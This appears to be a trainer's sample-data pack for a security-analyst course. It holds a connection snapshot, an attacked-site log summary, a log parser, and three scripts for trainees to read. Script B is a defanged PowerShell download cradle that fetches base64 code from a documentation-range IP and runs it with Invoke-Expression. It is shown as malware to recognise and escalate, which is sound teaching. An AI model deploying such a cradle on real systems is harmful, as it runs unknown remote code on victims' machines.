# DAY 5 — SAMPLE DATA
## The materials the activities and demonstrations use
### Trainer, and trainees where marked. Send the two data files with the joining note.

---

## WHAT IS IN HERE

| Section | Used by | Also shipped as a file |
|---------|---------|-----------------------|
| 1 · The WKS-311 connection snapshot | Demo 4, PM Task 8 | — |
| 2 · The attacked-site access log | Activity 3, Demo 7, PM Tasks 6 & 7 | **`Day_5_access_log.txt`** |
| 3 · The log parser | Demo 7, PM Task 7 | **`Day_5_log_parser.py`** |
| 4 · The three Activity 4 scripts | Activity 4 | — *(kept here on purpose; see the safety note)* |

> **Safety note.** Every address in here is from a documentation-only range (`192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24` — RFC 5737) or the Tor node `185.220.101.1` carried over from Day 3. Every URL in the scripts is **defanged** (`hxxp://`) so nothing is runnable even by accident. No live malware, no real client data, no runnable attacker URL appears anywhere in the Day 5 set.

---
---

# 1 — THE WKS-311 CONNECTION SNAPSHOT

This is what an analyst would have seen if, on Day 3, someone had run `netstat -ano` on WKS-311 while the alert was live. It is the missing evidence the Day 3 relay could not get. Trainees use it in **PM Task 8** to re-ticket the alert properly.

```
C:\> netstat -ano | findstr ESTABLISHED

  Proto  Local Address        Foreign Address         State         PID
  TCP    192.168.10.31:52210  185.220.101.1:443       ESTABLISHED   6820
  TCP    192.168.10.31:52214  185.220.101.1:443       ESTABLISHED   6820
  TCP    192.168.10.31:49706  40.99.12.20:443         ESTABLISHED   4188
  TCP    192.168.10.31:49712  20.190.128.5:443        ESTABLISHED   4188

C:\> tasklist /fi "pid eq 6820"

  Image Name          PID    Session   Mem Usage
  =================   =====  ========  =========
  svhost32.exe        6820   0          8,140 K

C:\> tasklist /fi "pid eq 4188"

  Image Name          PID    Session   Mem Usage
  =================   =====  ========  =========
  outlook.exe         4188   1         214,900 K
```

**What the snapshot establishes, for the re-ticket:**

- WKS-311's private address is `192.168.10.31` — inside the building.
- The two connections to `185.220.101.1:443` (the Day 3 Tor node) are owned by **PID 6820**, which is **`svhost32.exe`** — the misspelled, masquerading process name from Day 3 Alert B. That is the process the Day 3 ticket could not name.
- `outlook.exe` (PID 4188) talking to Microsoft ranges on 443 is normal mail traffic — it is in the snapshot so the trainee has to separate signal from noise.

---
---

# 2 — THE ATTACKED-SITE ACCESS LOG

**Shipped as `Day_5_access_log.txt`. Send it to the class.** Forty request lines from a small public website, `www.example-client.ph`, in Apache "combined" log format. Six addresses appear:

| Address | Who it is | User-agent | Reads as |
|---------|-----------|------------|----------|
| `203.0.113.10` | A real visitor on a Windows laptop | Chrome | Normal browsing (one 404 for a missing favicon) |
| `203.0.113.11` | A real visitor on an iPhone | Safari | Normal browsing, submits the contact form |
| `203.0.113.12` | A real visitor on Android | Chrome Mobile | Normal browsing |
| `198.51.100.23` | A vulnerability **scanner** | `Nikto/2.5.0` | A burst of 404s hunting for admin paths |
| `203.0.113.45` | The **attacker** | `python-requests` | Brute-forces `wp-login.php`, gets in, uploads a shell, runs commands |
| `192.0.2.77` | The attacker, or a second probe | `curl` | Two blocked path-traversal attempts, then one normal download |

The full sequence and the answer to every Activity 3 and Task 6 question is in `Day_5_Solutions.md`.

> **The numbers the parser prints** (so you can confirm it works): status codes **200=27, 302=2, 304=1, 403=3, 404=7**; requests by IP **203.0.113.45=14, 198.51.100.23=10, 203.0.113.10=7, 203.0.113.11=4, 192.0.2.77=3, 203.0.113.12=2**. Of the seven 404s, **six belong to the scanner `198.51.100.23`** and one is the visitor's missing favicon.

---
---

# 3 — THE LOG PARSER

**Shipped as `Day_5_log_parser.py`. Send it to the class.** It is printed here so trainees who cannot open the file can still read it, and so the trainer can walk it in Demo 7.

```python
# Day_5_log_parser.py
# Counts requests by status code and by IP address in a web access log.
# Usage:  python Day_5_log_parser.py Day_5_access_log.txt
# It only READS the log. It changes nothing and sends nothing anywhere.
import re
import sys
from collections import Counter

# IP  -  -  [time]  "METHOD PATH PROTOCOL"  STATUS
LINE = re.compile(r'^(\S+) \S+ \S+ \[([^\]]+)\] "(\S+) (\S+) [^"]*" (\d{3}) ')

statuses = Counter()
ips = Counter()

with open(sys.argv[1], encoding="utf-8") as log:
    for line in log:
        match = LINE.match(line)
        if not match:
            continue                      # skip lines that are not requests
        ip, when, method, path, status = match.groups()
        statuses[status] += 1
        ips[ip] += 1

print("Requests by status code:")
for status, count in sorted(statuses.items()):
    print(f"  {status}  {count}")

print("Requests by IP address:")
for ip, count in ips.most_common():
    print(f"  {ip:<16} {count}")
```

**Read it in five parts, and this is exactly how Demo 7 walks it:**

1. `import re, sys, Counter` — borrow three tools: pattern-matching, the command-line argument, and a counter.
2. `LINE = re.compile(...)` — one pattern that pulls the IP, the time, the method, the path and the status code out of a log line.
3. `with open(sys.argv[1]) as log:` — open the file named on the command line, and read it one line at a time.
4. The loop — for each line, if it matches, add one to that status code's tally and one to that IP's tally. `continue` skips anything that is not a request.
5. The two `print` blocks — show the tallies.

**The bash equivalent** (shown from a screenshot, not run by trainees): `awk '{print $9}' Day_5_access_log.txt | sort | uniq -c` for the status codes, `awk '{print $1}' ... | sort | uniq -c | sort -rn` for the IPs.

**The PowerShell equivalent** (Demo 7 shows this too):
```powershell
Get-Content .\Day_5_access_log.txt |
  ForEach-Object { ($_ -split ' ')[8] } |
  Group-Object | Sort-Object Name | Select-Object Count, Name
```

---
---

# 4 — THE THREE ACTIVITY 4 SCRIPTS

Pairs **read** these and predict what each does. **Nobody runs anything.** These are printed for the trainer and reproduced in the Activity Pack for the class.

## Script A — benign inventory *(read it: what does it collect, and does it send anything out?)*

```powershell
# collect-baseline.ps1
$out = "C:\Evidence\Day_05\baseline_processes.csv"
Get-Process |
  Select-Object Name, Id, Path, Company |
  Sort-Object Name |
  Export-Csv -Path $out -NoTypeInformation
Write-Host "Wrote process list to $out"
```

**What it does:** lists the running processes and writes them to a local CSV. It reads the machine and writes one local file. It contacts nothing. This is the kind of script the class ran themselves in Demo 2 — a normal admin tool.

## Script B — a download cradle, DEFANGED *(read it: what is it trying to fetch, and what would it do with it?)*

```powershell
# update-check.ps1   <-- found in a scheduled task named "Adobe Update Checker"
$u = "hxxp://203.0.113.45/p.txt"                      # DEFANGED - not a real, reachable URL
$c = (New-Object Net.WebClient).DownloadString($u)    # fetch code from the internet
$b = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($c))
Invoke-Expression $b                                  # run whatever came back
```

**What it does:** reaches out to an internet address, downloads text, base64-decodes it into more code, and runs it with `Invoke-Expression`. This is a download cradle — the script is a launcher for code it does not contain. It is the Day 3 WKS-118 scheduled task, now shown as source. **This is the one you escalate. You never run it to find out what `p.txt` is.** The URL is defanged (`hxxp://`) so it cannot run even if someone tries.

## Script C — a parser with a bug *(read it: why does it always report zero 404s?)*

```python
import re, sys
from collections import Counter

LINE = re.compile(r'^(\S+) \S+ \S+ \[([^\]]+)\] "(\S+) (\S+) [^"]*" (\d{3}) ')
not_found = Counter()

with open(sys.argv[1], encoding="utf-8") as log:
    for line in log:
        m = LINE.match(line)
        if not m:
            continue
        ip, when, method, path, status = m.groups()
        if status == 404:                 # <-- THE BUG: status is the string "404", not the number 404
            not_found[ip] += 1

print("Addresses with 404s:")
for ip, count in not_found.most_common():
    print(f"  {ip:<16} {count}")
print("Total 404s:", sum(not_found.values()))
```

**What it does:** it is meant to count 404s per address, but `status` is a **string** (`"404"`) and it is compared to the **integer** `404`, which is never equal. So it runs cleanly, prints nothing under "Addresses with 404s", and reports `Total 404s: 0` — even though the log has seven. The fix is `if status == "404":`. **The lesson:** a script that runs without error and reports nothing has not proven there is nothing. Check silence against a second method.

---
